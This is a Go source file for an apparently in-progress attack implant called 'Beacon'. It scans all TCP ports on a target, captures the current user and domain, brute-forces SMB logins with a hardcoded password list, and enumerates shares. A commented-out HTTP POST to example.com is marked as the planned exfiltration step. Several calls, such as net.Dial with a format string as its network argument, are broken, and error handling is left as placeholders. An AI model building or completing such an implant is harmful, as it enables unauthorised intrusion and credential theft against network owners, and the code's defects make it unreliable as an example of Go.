package main

import (
	"fmt"
	"net"

	// "net/http"
	"os/user"
	"slices"
	"strings"

	"github.com/hirochachacha/go-smb2"
)

const MAX_PORTS = 65535

var PASSWORDS = [...]string{"test", "test", "tset"}

type Beacon struct {
	hostname string
	ports    []int
	domain   string
	username string
	password string
}

func (beaconObj *Beacon) PortScan() {
	for port := 1; port < MAX_PORTS; port++ {
		addr := net.JoinHostPort(beaconObj.hostname, fmt.Sprintf("%d", port))
		conn, err := net.Dial("tcp", addr)
		if err != nil {
			continue
		}
		conn.Close()
		beaconObj.ports = append(beaconObj.ports, port)
	}
}

func (beaconObj *Beacon) GetUser() {
	userObj, err := user.Current()
	if err != nil {
		// FILL IN
	}

	if strings.Contains(userObj.Username, `\`) {
		splitter := strings.Split(userObj.Username, `\`)
		beaconObj.username = splitter[1]
		beaconObj.domain = splitter[0]
	} else {
		beaconObj.username = userObj.Username
	}
}

func (beaconObj Beacon) SmbPivot() {
	if slices.Contains(beaconObj.ports, 445) {
		connObj, err := net.Dial("%s:445", beaconObj.hostname)
		if err != nil {
			panic(err)
		}
		defer connObj.Close()

		smbObj := &smb2.Dialer{
			Initiator: &smb2.NTLMInitiator{
				User:     beaconObj.username,
				Password: beaconObj.password,
			},
		}

		smbConn, err := smbObj.Dial(connObj)
		if err != nil {
			// FILL IN
		}
		defer smbConn.Logoff()

		shares, err := smbConn.ListSharenames()
		if err != nil {
			// FILL IN
		}

		for _, name := range shares {
			// SEND VIA HTTP
			fmt.Println(name)
		}
	}
}

func (beaconObj *Beacon) SmbBrute() {
	if !slices.Contains(beaconObj.ports, 445) {
		fmt.Println("SMB not found")
		return
	}

	connObj, err := net.Dial("%s:445", beaconObj.hostname)
	if err != nil {
		panic(err)
	}
	defer connObj.Close()

	smbObj := &smb2.Dialer{
		Initiator: &smb2.NTLMInitiator{
			User:     beaconObj.username,
			Password: beaconObj.password,
		},
	}

	for _, element := range PASSWORDS {
		smbObj.Initiator = &smb2.NTLMInitiator{
			User:     beaconObj.username,
			Password: element,
		}

		smbConn, err := smbObj.Dial(connObj)

		if err == nil {
			// Found valid creds!
			fmt.Println(beaconObj.username + element)
			beaconObj.password = element
			smbConn.Logoff()
			break
		}
	}

	if beaconObj == nil {
		fmt.Println("Password not found")
	}
}

func main() {
	// DO SOMETHING
	var b Beacon
	b.GetUser()
	fmt.Println(b.username)
	//x := strings.NewReader("test")
	//http.Post("http://example.com", "http/text", x)
}
